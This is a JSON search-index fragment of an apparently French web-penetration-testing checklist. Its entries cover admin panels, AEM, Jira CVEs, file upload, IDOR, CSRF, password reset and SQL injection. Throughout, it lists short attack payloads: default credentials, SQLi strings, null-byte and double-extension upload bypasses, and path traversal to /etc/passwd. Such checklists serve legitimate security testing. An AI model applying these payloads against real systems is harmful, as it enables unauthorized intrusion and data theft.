Checklist","lvl":2,"t":"Admin panel","c":"Credentials par défaut ( admin:admin , admin:password …). Bypass par SQLi / XSS / manipulation de réponse (200/302/success). Brute-force, fuzzing de répertoires, suppression de paramètre dans la requête. Erreurs de comparaison PHP ( user[]=a&pwd=b ), JSON avec booléens, NoSQL/XPath/LDAP injection."},{"id":"aem-adobe-experience-manager","u":"09_web-vuln-checklist.html#aem-adobe-experience-manager","sec":"Web Vulnerability Checklist","lvl":2,"t":"AEM (Adobe Experience Manager)","c":"Détection via nuclei tech-detect ; aem_hacker.py , aem-hacker , aem-rce-bundle . Bypass dispatcher (CVE-2016-0957) : querybuilder.json/a.css , ;%0aa.css , .servlet.css , ///etc.json . SSRF (Opensocial proxy, ReportingServicesProxyServlet CVE-2018-12809), RCE via Groovy console, XSS, secrets depuis le JCR (DefaultGETServlet, QueryBuilder servlets), DoS."},{"id":"api-authentication-authorization","u":"09_web-vuln-checklist.html#api-authentication-authorization","sec":"Web Vulnerability Checklist","lvl":2,"t":"API Authentication / Authorization","c":"97 tests JSON sur les endpoints d’auth (creds vides/null/nombres/booléens/arrays/objets, SQLi, unicode, malformed JSON, clés dupliquées, etc.). BOLA/IDOR : ID prédictible, combo ID, email comme ID, group ID, objets imbriqués, tokens prédictibles, pollution de paramètres ( %0d%0a , [2222,1111] , 2222;1111 …)."},{"id":"authentication","u":"09_web-vuln-checklist.html#authentication","sec":"Web Vulnerability Checklist","lvl":2,"t":"Authentication","c":"URLs post-auth accessibles directement ; CAPTCHA bypass via X-Forwarded-For . Absence de confirmation de mot de passe (change email/password, delete, 2FA). Absence de vérification email, pas de rate-limit, énumération d’utilisateurs, politique de mot de passe faible, inscription en HTTP. Broken auth / session token bugs (reset token réutilisable après changement d’email)."},{"id":"business-logic","u":"09_web-vuln-checklist.html#business-logic","sec":"Web Vulnerability Checklist","lvl":2,"t":"Business Logic","c":"Manipulation de prix (négatif, ×0.5, +- ), IDOR sur profils, panier. Abus des reviews / coupons (réutilisation, race condition, HPP), delivery charges, currency arbitrage, premium/refund abuse, cart/wishlist. Parameter tampering, manipulation de résultats d’examen ( 1=true ), flags d’auth & privesc applicatif, LDAP param, contraintes métier, bypass de flux."},{"id":"cookie-attacks","u":"09_web-vuln-checklist.html#cookie-attacks","sec":"Web Vulnerability Checklist","lvl":2,"t":"Cookie Attacks","c":"Données sensibles stockées ; cookie length → buffer overflow ; injection arbitraire (CRLF) ; mass assignment. Cookie bomb (DoS) ; SQLi dans le cookie ; parameter pollution ; auth bypass ; XSS reflété ; session puzzling. Python code injection / OS command via eval(compile(...)) dans un cookie ; insecure deserialization."},{"id":"csrf","u":"09_web-vuln-checklist.html#csrf","sec":"Web Vulnerability Checklist","lvl":2,"t":"CSRF","c":"Bypass : pas de token / token faible / réutilisable, check content-type / referer, changement de méthode, method override, token dupliqué dans un cookie. Tester : suppression du token, token non lié à la session, referer validation dépendante de sa présence."},{"id":"exif-geolocation","u":"09_web-vuln-checklist.html#exif-geolocation","sec":"Web Vulnerability Checklist","lvl":2,"t":"EXIF / Geolocation","c":"Images uploadées dont les métadonnées EXIF (géoloc, device) ne sont pas strippées → divulgation. Vérifier via exif.regex.info/exif.cgi ."},{"id":"file-upload","u":"09_web-vuln-checklist.html#file-upload","sec":"Web Vulnerability Checklist","lvl":2,"t":"File Upload","c":"Bypass extensions : .pht , .phtml , double extension ( .jpg.php ), null byte ( shell.php%00.jpg ), casse mixte ( pHp ), caractères spéciaux ( php%20 , php... ), RTL override ( name.%E2%80%AEphp.jpg ), ADS Windows ( file.php::$data ). Content-Type spoofing ( image/gif + magic GIF89a ), double Content-Type, filename dupliqué. Charges : XSS (SVG/HTML), XXE (SVG/XML), SSRF (filename = URL, type=url), LFI ( image.png../../../etc/passwd ), OOB SQLi via filename, RCE (ImageTragick, ffmpeg HLS, zip symlink, .htaccess / web.config ). ImageMagick/Ghostscript : lecture de fichiers et exécution de commandes via PostScript."},{"id":"django-symfony","u":"09_web-vuln-checklist.html#django-symfony","sec":"Web Vulnerability Checklist","lvl":2,"t":"Django / Symfony","c":"Django : debug mode → RCE ; /app/tmp/healthcheck.json , /fxa-rp-events (fuite INSTALLED_APPS , DATABASES , AWS_* …) ; wordlist django_long.txt . Symfony : _profiler , app_dev.php/_profiler , secret fragment exploit (ambionics) ; nuclei templates ; wordlist symphony_long.txt ."},{"id":"idor","u":"09_web-vuln-checklist.html#idor","sec":"Web Vulnerability Checklist","lvl":2,"t":"IDOR","c":"Deux comptes, changement de param ID ; changement de méthode HTTP ; path traversal ; content-type ; wildcard ; versions d’API obsolètes ; JSON param pollution ; wrapping ID ( [123] , {userid:123} ) ; GraphQL."},{"id":"jira","u":"09_web-vuln-checklist.html#jira","sec":"Web Vulnerability Checklist","lvl":2,"t":"Jira","c":"Scanners (Jiraffe, jira_scan, Jira-Lens) ; CVE-2017-9506 (SSRF), 2019-8451 (SSRF), 2019-8449/3403 (user enum), 2019-11581 (SSTI/RCE), 2019-3396 (path traversal/RCE), 2020-14179/14178/14181, 2021-26086 (file read), 2022-0540 (auth bypass), 2022-26135 (SSRF). /rest/api/2/mypermissions pour vérifier les privilèges non-authentifiés ; Google dorks Jira."},{"id":"mass-assignment","u":"09_web-vuln-checklist.html#mass-assignment","sec":"Web Vulnerability Checklist","lvl":2,"t":"Mass Assignment","c":"Tester admin:true , role:admin , user_priv:administrator , org:CompanyA sur register/reset/login/change email. Automatisation : arjun --headers ... --include='{$arjun$}' ."},{"id":"rate-limit-bypass","u":"09_web-vuln-checklist.html#rate-limit-bypass","sec":"Web Vulnerability Checklist","lvl":2,"t":"Rate limit bypass","c":"Null chars ( %00 , %0d%0a , %09 ), Host header injection, changement de cookie/session, X-Forwarded-For (multiples), double header."},{"id":"rce-chaînes","u":"09_web-vuln-checklist.html#rce-chaînes","sec":"Web Vulnerability Checklist","lvl":2,"t":"RCE (chaînes)","c":"Via dependency confusion, file upload, SQLi, LFI (log poisoning), SSRF, XXE ( expect:// ), command injection (LaTeX), insecure deserialization, SSTI (tplmap)."},{"id":"register","u":"09_web-vuln-checklist.html#register","sec":"Web Vulnerability Checklist","lvl":2,"t":"Register","c":"Overwrite d’un utilisateur existant (même email, casse différente), DoS sur name/password, pas de rate-limit, XSS dans username/email. Bypass de vérification email (response/status manipulation), politique de mot de passe faible, path overwrite ( index.php , login.php )."},{"id":"reset-password","u":"09_web-vuln-checklist.html#reset-password","sec":"Web Vulnerability Checklist","lvl":2,"t":"Reset password","c":"Token de l’attaquant sur l’email victime, Host Header injection, HTML injection dans le Host, fuite du token dans le Referer. Ajout de password / pass à l’invitation, CRLF dans l’URL, suppression/ 0000 / null /array de tokens, SQLi wildcard, response manipulation, token massif, usage cross-domain, fuite dans le body."},{"id":"rxss","u":"09_web-vuln-checklist.html#rxss","sec":"Web Vulnerability Checklist","lvl":2,"t":"RXSS","c":"Outils : xsscrapy, XSStrike, Dalfox, kxss, gxss. Oneliners : cat targets | waybackurls | gf xss | ... | dalfox pipe . Injecter via l’API si l’UI filtre."},{"id":"sql-injection-payloads","u":"09_web-vuln-checklist.html#sql-injection-payloads","sec":"Web Vulnerability Checklist","lvl":2,"t":"SQL injection (payloads)","c":"Grande liste de payloads ( ' or 1=1-- , time-based SLEEP(5) , WAITFOR DELAY , BENCHMARK , pg_sleep , UNION SELECT 1..N, stacked queries, etc.). Voir le fichier sqlpayload.txt du vault."},{"id":"tips-twitterveille","u":"09_web-vuln-checklist.html#tips-twitterveille","sec":"Web Vulnerability Checklist","lvl":2,"t":"Tips (Twitter/veille)","c":"Nombreuses astuces : role JS admin_role , IIS c:/Windows/Win.ini , CloudFront bypass, JS recon (LinkFinder/JS-Miner), wp-config.php.swp , SQLi auth bypass '-- , PeopleSoft default creds, SVN .svn/wc.db + svn-extractor, phpMyAdmin casse, JIRA dorks, GitHub recon (CSV/tokens), cookie bomb, XSS via JWT, {{7*7}} (AngularJS), IDOR Rails ( /reports/12345 )."}];